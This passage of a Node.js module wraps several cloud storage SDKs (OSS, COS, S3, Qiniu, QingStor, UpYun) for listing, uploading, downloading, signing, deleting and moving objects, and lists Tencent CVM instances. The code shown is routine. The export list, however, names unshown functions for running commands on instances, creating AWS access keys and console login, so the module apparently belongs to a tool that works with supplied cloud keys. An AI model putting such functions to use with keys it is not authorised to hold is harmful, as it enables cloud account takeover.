  const s3 = s3Client({ access_key, secret_key, region, endpoint, forcePathStyle })
  const params = {
    Bucket: bucket,
    Prefix: prefix || '',
    MaxKeys: maxKeys || 100
  }
  if (continuationToken) params.ContinuationToken = continuationToken
  if (delimiter) params.Delimiter = delimiter
  const data = await s3Promise(cb => s3.listObjectsV2(params, cb))
  return {
    objects: (data.Contents || []).map(o => ({
      name: o.Key, size: o.Size, lastModified: o.LastModified, etag: o.ETag, isDir: false
    })),
    prefixes: (data.CommonPrefixes || []).map(p => ({
      name: p.Prefix, size: '-', lastModified: '', isDir: true
    })),
    nextMarker: data.NextContinuationToken || null,
    isTruncated: !!data.IsTruncated
  }
}

async function qingstorListBuckets({ access_key, secret_key }) {
  const QingStor = require('qingstor-sdk')
  const config = new QingStor.Config({
    access_key_id: access_key,
    secret_access_key: secret_key,
    host: 'qingstor.com',
    port: 443,
    protocol: 'https'
  })
  const qs = new QingStor.QingStor(config)
  const res = await qs.listBuckets()
  if (res.statusCode && res.statusCode >= 400) {
    throw new Error(JSON.stringify(res))
  }
  return {
    buckets: (res.buckets || []).map(b => ({
      name: b.name,
      region: b.location || '',
      creationDate: b.created || ''
    }))
  }
}

async function qingstorListObjects({ access_key, secret_key, bucket, zone, prefix }) {
  const QingStor = require('qingstor-sdk')
  const config = new QingStor.Config({
    access_key_id: access_key,
    secret_access_key: secret_key,
    host: 'qingstor.com',
    port: 443,
    protocol: 'https'
  })
  const qs = new QingStor.QingStor(config)
  const b = qs.Bucket(bucket, zone || 'pek3a')
  const res = await b.listObjects({ prefix: prefix || '', limit: 100 })
  if (res.statusCode && res.statusCode >= 400) {
    throw new Error(JSON.stringify(res))
  }
  return {
    objects: (res.keys || []).map(o => ({
      name: o.key,
      size: o.size,
      lastModified: o.modified || ''
    }))
  }
}

/* ---------------- upload / download / presign / CDN ---------------- */
const path = require('path')
const fs = require('fs')

async function ossPutObject({ access_key, secret_key, region, bucket, key, localPath }) {
  const OSS = require('ali-oss')
  const client = new OSS({
    accessKeyId: access_key, accessKeySecret: secret_key,
    region: region || 'oss-cn-hangzhou', bucket
  })
  const objectKey = key || path.basename(localPath)
  const r = await client.put(objectKey, localPath)
  return { key: objectKey, url: r.url, name: r.name }
}

async function ossGetObject({ access_key, secret_key, region, bucket, key, localPath }) {
  const OSS = require('ali-oss')
  const client = new OSS({
    accessKeyId: access_key, accessKeySecret: secret_key,
    region: region || 'oss-cn-hangzhou', bucket
  })
  await client.get(key, localPath)
  return { key, localPath }
}

async function ossSignUrl({ access_key, secret_key, region, bucket, key, expires }) {
  const OSS = require('ali-oss')
  const client = new OSS({
    accessKeyId: access_key, accessKeySecret: secret_key,
    region: region || 'oss-cn-hangzhou', bucket
  })
  return { url: client.signatureUrl(key, { expires: expires || 3600 }) }
}

async function cosPutObject({ access_key, secret_key, Bucket, Region, Key, localPath }) {
  const cos = cosClient({ secretId: access_key, secretKey: secret_key })
  const objectKey = Key || path.basename(localPath)
  await cosPromise(cb => cos.putObject({
    Bucket, Region, Key: objectKey, Body: fs.createReadStream(localPath)
  }, cb))
  return { key: objectKey }
}

async function cosGetObject({ access_key, secret_key, Bucket, Region, Key, localPath }) {
  const cos = cosClient({ secretId: access_key, secretKey: secret_key })
  await cosPromise(cb => cos.getObject({
    Bucket, Region, Key, Output: fs.createWriteStream(localPath)
  }, cb))
  return { key: Key, localPath }
}

async function cosSignUrl({ access_key, secret_key, Bucket, Region, Key, expires }) {
  const cos = cosClient({ secretId: access_key, secretKey: secret_key })
  const url = await new Promise((resolve, reject) => {
    cos.getObjectUrl({
      Bucket, Region, Key, Sign: true, Expires: expires || 3600
    }, (err, data) => err ? reject(err) : resolve(data.Url))
  })
  return { url }
}

async function s3PutObject({ access_key, secret_key, region, endpoint, forcePathStyle, bucket, key, localPath }) {
  const s3 = s3Client({ access_key, secret_key, region, endpoint, forcePathStyle })
  const objectKey = key || path.basename(localPath)
  await s3Promise(cb => s3.upload({
    Bucket: bucket, Key: objectKey, Body: fs.createReadStream(localPath)
  }, cb))
  return { key: objectKey }
}

async function s3GetObject({ access_key, secret_key, region, endpoint, forcePathStyle, bucket, key, localPath }) {
  const s3 = s3Client({ access_key, secret_key, region, endpoint, forcePathStyle })
  const data = await s3Promise(cb => s3.getObject({ Bucket: bucket, Key: key }, cb))
  fs.writeFileSync(localPath, data.Body)
  return { key, localPath }
}

async function s3SignUrl({ access_key, secret_key, region, endpoint, forcePathStyle, bucket, key, expires }) {
  const s3 = s3Client({ access_key, secret_key, region, endpoint, forcePathStyle })
  const url = s3.getSignedUrl('getObject', {
    Bucket: bucket, Key: key, Expires: expires || 3600
  })
  return { url }
}

async function qiniuPutObject({ access_key, secret_key, bucket, key, localPath }) {
  const qiniu = require('qiniu')
  const mac = new qiniu.auth.digest.Mac(access_key, secret_key)
  const objectKey = key || path.basename(localPath)
  const putPolicy = new qiniu.rs.PutPolicy({ scope: `${bucket}:${objectKey}` })
  const uploadToken = putPolicy.uploadToken(mac)
  const config = new qiniu.conf.Config()
  const formUploader = new qiniu.form_up.FormUploader(config)
  const putExtra = new qiniu.form_up.PutExtra()
  const body = await new Promise((resolve, reject) => {
    formUploader.putFile(uploadToken, objectKey, localPath, putExtra, (err, respBody, info) => {
      if (err) return reject(err)
      if (info.statusCode >= 400) return reject(new Error(JSON.stringify(respBody || info)))
      resolve(respBody)
    })
  })
  return { key: objectKey, hash: body.hash }
}

async function qiniuGetObject({ access_key, secret_key, bucket, key, localPath, domain }) {
  const qiniu = require('qiniu')
  const mac = new qiniu.auth.digest.Mac(access_key, secret_key)
  const config = new qiniu.conf.Config()
  const bm = new qiniu.rs.BucketManager(mac, config)
  if (!domain) throw new Error('下载七牛对象需要填写自定义域名 domain')
  const base = domain.replace(/\/$/, '')
  const deadline = Math.floor(Date.now() / 1000) + 3600
  const url = bm.privateDownloadUrl(base, key, deadline)
  const axios = require('axios')
  const res = await axios.get(url, { responseType: 'arraybuffer', validateStatus: () => true })
  if (res.status >= 400) throw new Error(`下载失败 HTTP ${res.status}`)
  fs.writeFileSync(localPath, Buffer.from(res.data))
  return { key, localPath, url }
}

async function qiniuSignUrl({ access_key, secret_key, key, domain, expires }) {
  const qiniu = require('qiniu')
  const mac = new qiniu.auth.digest.Mac(access_key, secret_key)
  const config = new qiniu.conf.Config()
  const bm = new qiniu.rs.BucketManager(mac, config)
  if (!domain) throw new Error('生成链接需要填写自定义域名 domain')
  const base = domain.replace(/\/$/, '')
  const deadline = Math.floor(Date.now() / 1000) + (expires || 3600)
  return { url: bm.privateDownloadUrl(base, key, deadline) }
}

async function qiniuRefreshCdn({ access_key, secret_key, urls }) {
  const qiniu = require('qiniu')
  const mac = new qiniu.auth.digest.Mac(access_key, secret_key)
  const cdnManager = new qiniu.cdn.CdnManager(mac)
  const list = Array.isArray(urls) ? urls : String(urls || '').split(/[\n,]+/).map(s => s.trim()).filter(Boolean)
  if (!list.length) throw new Error('urls 不能为空')
  const body = await new Promise((resolve, reject) => {
    cdnManager.refreshUrls(list, (err, respBody, info) => {
      if (err) return reject(err)
      if (info && info.statusCode >= 400) return reject(new Error(JSON.stringify(respBody || info)))
      resolve(respBody)
    })
  })
  return body
}

async function ossDeleteObject({ access_key, secret_key, region, bucket, key }) {
  const OSS = require('ali-oss')
  const client = new OSS({
    accessKeyId: access_key, accessKeySecret: secret_key,
    region: region || 'oss-cn-hangzhou', bucket
  })
  await client.delete(key)
  return { key }
}

async function cosDeleteObject({ access_key, secret_key, Bucket, Region, Key }) {
  const cos = cosClient({ secretId: access_key, secretKey: secret_key })
  await cosPromise(cb => cos.deleteObject({ Bucket, Region, Key }, cb))
  return { key: Key }
}

async function s3DeleteObject({ access_key, secret_key, region, endpoint, forcePathStyle, bucket, key }) {
  const s3 = s3Client({ access_key, secret_key, region, endpoint, forcePathStyle })
  await s3Promise(cb => s3.deleteObject({ Bucket: bucket, Key: key }, cb))
  return { key }
}

async function qiniuDeleteObject({ access_key, secret_key, bucket, key }) {
  const qiniu = require('qiniu')
  const mac = new qiniu.auth.digest.Mac(access_key, secret_key)
  const config = new qiniu.conf.Config()
  const bm = new qiniu.rs.BucketManager(mac, config)
  await qiniuPromise(cb => bm.delete(bucket, key, cb))
  return { key }
}

async function qingstorPutObject({ access_key, secret_key, bucket, zone, key, localPath }) {
  const QingStor = require('qingstor-sdk')
  const config = new QingStor.Config({
    access_key_id: access_key, secret_access_key: secret_key,
    host: 'qingstor.com', port: 443, protocol: 'https'
  })
  const qs = new QingStor.QingStor(config)
  const b = qs.Bucket(bucket, zone || 'pek3a')
  const objectKey = key || path.basename(localPath)
  const body = fs.readFileSync(localPath)
  const res = await b.putObject(objectKey, { body })
  if (res.statusCode && res.statusCode >= 400) throw new Error(JSON.stringify(res))
  return { key: objectKey }
}

async function qingstorGetObject({ access_key, secret_key, bucket, zone, key, localPath }) {
  const QingStor = require('qingstor-sdk')
  const config = new QingStor.Config({
    access_key_id: access_key, secret_access_key: secret_key,
    host: 'qingstor.com', port: 443, protocol: 'https'
  })
  const qs = new QingStor.QingStor(config)
  const b = qs.Bucket(bucket, zone || 'pek3a')
  const res = await b.getObject(key)
  if (res.statusCode && res.statusCode >= 400) throw new Error(JSON.stringify(res))
  const data = res.data || res.body
  fs.writeFileSync(localPath, Buffer.isBuffer(data) ? data : Buffer.from(data))
  return { key, localPath }
}

async function qingstorDeleteObject({ access_key, secret_key, bucket, zone, key }) {
  const QingStor = require('qingstor-sdk')
  const config = new QingStor.Config({
    access_key_id: access_key, secret_access_key: secret_key,
    host: 'qingstor.com', port: 443, protocol: 'https'
  })
  const qs = new QingStor.QingStor(config)
  const b = qs.Bucket(bucket, zone || 'pek3a')
  const res = await b.deleteObject(key)
  if (res.statusCode && res.statusCode >= 400) throw new Error(JSON.stringify(res))
  return { key }
}

async function upyunPutObject({ service, operator, password, remotePath, localPath }) {
  const upyun = require('upyun')
  const svc = new upyun.Service(service, operator, password)
  const client = new upyun.Client(svc)
  const dest = remotePath || ('/' + path.basename(localPath))
  const ok = await client.putFile(dest, fs.readFileSync(localPath))
  if (!ok) throw new Error('又拍云上传失败')
  return { key: dest }
}

async function upyunGetObject({ service, operator, password, remotePath, localPath }) {
  const upyun = require('upyun')
  const svc = new upyun.Service(service, operator, password)
  const client = new upyun.Client(svc)
  const buf = await client.getFile(remotePath, null)
  if (buf === false) throw new Error('又拍云下载失败')
  fs.writeFileSync(localPath, Buffer.isBuffer(buf) ? buf : Buffer.from(buf))
  return { key: remotePath, localPath }
}

async function upyunDeleteObject({ service, operator, password, remotePath }) {
  const upyun = require('upyun')
  const svc = new upyun.Service(service, operator, password)
  const client = new upyun.Client(svc)
  const ok = await client.deleteFile(remotePath)
  if (!ok) throw new Error('又拍云删除失败')
  return { key: remotePath }
}

/* ---------------- mkdir / move (copy+delete) ---------------- */
async function ossMkdir({ access_key, secret_key, region, bucket, dir }) {
  const key = String(dir || '').replace(/^\/+/, '').replace(/\/?$/, '/')
  if (!key || key === '/') throw new Error('目录名无效')
  const OSS = require('ali-oss')
  const client = new OSS({
    accessKeyId: access_key, accessKeySecret: secret_key,
    region: region || 'oss-cn-hangzhou', bucket
  })
  await client.put(key, Buffer.alloc(0))
  return { key }
}

async function ossMoveObject({ access_key, secret_key, region, bucket, fromKey, toKey }) {
  const OSS = require('ali-oss')
  const client = new OSS({
    accessKeyId: access_key, accessKeySecret: secret_key,
    region: region || 'oss-cn-hangzhou', bucket
  })
  await client.copy(toKey, fromKey)
  await client.delete(fromKey)
  return { fromKey, toKey }
}

async function cosMkdir({ access_key, secret_key, Bucket, Region, dir }) {
  const Key = String(dir || '').replace(/^\/+/, '').replace(/\/?$/, '/')
  if (!Key || Key === '/') throw new Error('目录名无效')
  const cos = cosClient({ secretId: access_key, secretKey: secret_key })
  await cosPromise(cb => cos.putObject({ Bucket, Region, Key, Body: Buffer.alloc(0) }, cb))
  return { key: Key }
}

async function cosMoveObject({ access_key, secret_key, Bucket, Region, fromKey, toKey }) {
  const cos = cosClient({ secretId: access_key, secretKey: secret_key })
  await cosPromise(cb => cos.putObjectCopy({
    Bucket, Region, Key: toKey,
    CopySource: `${Bucket}.cos.${Region}.myqcloud.com/${encodeURIComponent(fromKey).replace(/%2F/g, '/')}`
  }, cb))
  await cosPromise(cb => cos.deleteObject({ Bucket, Region, Key: fromKey }, cb))
  return { fromKey, toKey }
}

async function s3Mkdir({ access_key, secret_key, region, endpoint, forcePathStyle, bucket, dir }) {
  const Key = String(dir || '').replace(/^\/+/, '').replace(/\/?$/, '/')
  if (!Key || Key === '/') throw new Error('目录名无效')
  const s3 = s3Client({ access_key, secret_key, region, endpoint, forcePathStyle })
  await s3Promise(cb => s3.putObject({ Bucket: bucket, Key, Body: Buffer.alloc(0) }, cb))
  return { key: Key }
}

async function s3MoveObject({ access_key, secret_key, region, endpoint, forcePathStyle, bucket, fromKey, toKey }) {
  const s3 = s3Client({ access_key, secret_key, region, endpoint, forcePathStyle })
  await s3Promise(cb => s3.copyObject({
    Bucket: bucket, Key: toKey, CopySource: encodeURIComponent(bucket + '/' + fromKey).replace(/%2F/g, '/')
  }, cb))
  await s3Promise(cb => s3.deleteObject({ Bucket: bucket, Key: fromKey }, cb))
  return { fromKey, toKey }
}

async function qiniuMoveObject({ access_key, secret_key, bucket, fromKey, toKey, toBucket }) {
  const qiniu = require('qiniu')
  const mac = new qiniu.auth.digest.Mac(access_key, secret_key)
  const config = new qiniu.conf.Config()
  const bm = new qiniu.rs.BucketManager(mac, config)
  await qiniuPromise(cb => bm.move(bucket, fromKey, toBucket || bucket, toKey, { force: true }, cb))
  return { fromKey, toKey }
}

async function qingstorMkdir({ access_key, secret_key, bucket, zone, dir }) {
  const key = String(dir || '').replace(/^\/+/, '').replace(/\/?$/, '/')
  if (!key || key === '/') throw new Error('目录名无效')
  const QingStor = require('qingstor-sdk')
  const cfg = new QingStor.Config({ access_key_id: access_key, secret_access_key: secret_key, host: 'qingstor.com', port: 443, protocol: 'https' })
  const qs = new QingStor.QingStor(cfg)
  const b = qs.Bucket(bucket, zone || 'pek3b')
  const res = await b.putObject(key, { body: Buffer.alloc(0) })
  if (res.statusCode && res.statusCode >= 400) throw new Error(JSON.stringify(res))
  return { key }
}

async function qingstorMoveObject({ access_key, secret_key, bucket, zone, fromKey, toKey }) {
  const QingStor = require('qingstor-sdk')
  const cfg = new QingStor.Config({ access_key_id: access_key, secret_access_key: secret_key, host: 'qingstor.com', port: 443, protocol: 'https' })
  const qs = new QingStor.QingStor(cfg)
  const b = qs.Bucket(bucket, zone || 'pek3b')
  // 拉取再上传再删（SDK 无统一 move）
  const got = await b.getObject(fromKey)
  if (got.statusCode && got.statusCode >= 400) throw new Error(JSON.stringify(got))
  const body = got.data || got.body || Buffer.alloc(0)
  const put = await b.putObject(toKey, { body })
  if (put.statusCode && put.statusCode >= 400) throw new Error(JSON.stringify(put))
  await b.deleteObject(fromKey)
  return { fromKey, toKey }
}

async function upyunMkdir({ service, operator, password, dir }) {
  const upyun = require('upyun')
  const client = new upyun.Client(new upyun.Service(service, operator, password))
  let p = String(dir || '').replace(/\/+/g, '/')
  if (!p.startsWith('/')) p = '/' + p
  if (!p.endsWith('/')) p += '/'
  if (p === '/') throw new Error('目录名无效')
  const ok = await client.makeDir(p)
  if (!ok) throw new Error('又拍云建目录失败')
  return { key: p }
}

async function upyunMoveObject({ service, operator, password, fromKey, toKey }) {
  const upyun = require('upyun')
  const client = new upyun.Client(new upyun.Service(service, operator, password))
  const src = String(fromKey || '').startsWith('/') ? fromKey : ('/' + fromKey)
  const dst = String(toKey || '').startsWith('/') ? toKey : ('/' + toKey)
  // 优先 move；不支持则 copy+delete
  if (typeof client.move === 'function') {
    const ok = await client.move(src, dst)
    if (!ok) throw new Error('又拍云移动失败')
  } else if (typeof client.copy === 'function') {
    const ok = await client.copy(src, dst)
    if (!ok) throw new Error('又拍云复制失败')
    await client.deleteFile(src)
  } else {
    const buf = await client.getFile(src, null)
    if (buf === false) throw new Error('又拍云读取源文件失败')
    const putOk = await client.putFile(dst, buf)
    if (!putOk) throw new Error('又拍云写入目标失败')
    await client.deleteFile(src)
  }
  return { fromKey: src, toKey: dst }
}

function tencentCvm(secretId, secretKey, region) {
  const tencentcloud = require('tencentcloud-sdk-nodejs')
  const CvmClient = tencentcloud.cvm.v20170312.Client
  return new CvmClient({
    credential: { secretId, secretKey },
    region: region || 'ap-guangzhou',
    profile: { httpProfile: { endpoint: 'cvm.tencentcloudapi.com' } }
  })
}

async function tencentDescribeRegions({ access_key, secret_key }) {
  const cvm = tencentCvm(access_key, secret_key, 'ap-guangzhou')
  const res = await cvm.DescribeRegions({})
  return {
    RegionSet: (res.RegionSet || []).map(r => ({
      Region: r.Region,
      RegionName: r.RegionName,
      RegionState: r.RegionState
    }))
  }
}

async function tencentDescribeInstances({ access_key, secret_key, region, Offset = 0, Limit = 100 }) {
  const cvm = tencentCvm(access_key, secret_key, region || 'ap-guangzhou')
  const res = await cvm.DescribeInstances({ Offset, Limit })
  return {
    TotalCount: res.TotalCount || 0,
    // 保留列表/详细信息所需字段（此前裁太狠会导致公网 IP/配置/系统全空）
    InstanceSet: (res.InstanceSet || []).map(i => ({
      InstanceId: i.InstanceId,
      InstanceName: i.InstanceName,
      InstanceState: i.InstanceState,
      InstanceType: i.InstanceType,
      CPU: i.CPU,
      Memory: i.Memory,
      OsName: i.OsName,
      PublicIpAddresses: i.PublicIpAddresses || [],
      PrivateIpAddresses: i.PrivateIpAddresses || [],
      CreatedTime: i.CreatedTime,
      ExpiredTime: i.ExpiredTime,
      Region: region,
      Placement: i.Placement || null
    }))
  }
}

module.exports = {
  randPass,
  tencentConsole, tencentCancel, tencentListUsers, tencentRunCommand,
  tencentDescribeRegions, tencentDescribeInstances,
  huaweiConsole, huaweiCancel,
  awsConsole, awsListUsers, awsCreateAccessKey, awsListPolicies,
  ucloudListProjects, ucloudConsole, ucloudCancel, ucloudOrderList, ucloudListUsers, ucloudGetUserInfoList,
  ossListBuckets, ossListObjects,
  tencentListUsersRaw, tencentDescribeDomains, huaweiListUsers,
  cosListBuckets, cosListObjects, httpRequest,
  aiListModels, aiChatCompletions, aiProbe, aiAbort,
  qiniuListBuckets, qiniuListObjects, upyunListDir,
  s3ListBuckets, s3ListObjects,
  qingstorListBuckets, qingstorListObjects,
  ossPutObject, ossGetObject, ossSignUrl, ossDeleteObject,
  cosPutObject, cosGetObject, cosSignUrl, cosDeleteObject,
  s3PutObject, s3GetObject, s3SignUrl, s3DeleteObject,
  qiniuPutObject, qiniuGetObject, qiniuSignUrl, qiniuRefreshCdn, qiniuDeleteObject,
  qingstorPutObject, qingstorGetObject, qingstorDeleteObject,
  upyunPutObject, upyunGetObject, upyunDeleteObject,
  ossMkdir, ossMoveObject, cosMkdir, cosMoveObject,
  s3Mkdir, s3MoveObject, qiniuMoveObject,
  qingstorMkdir, qingstorMoveObject, upyunMkdir, upyunMoveObject
}
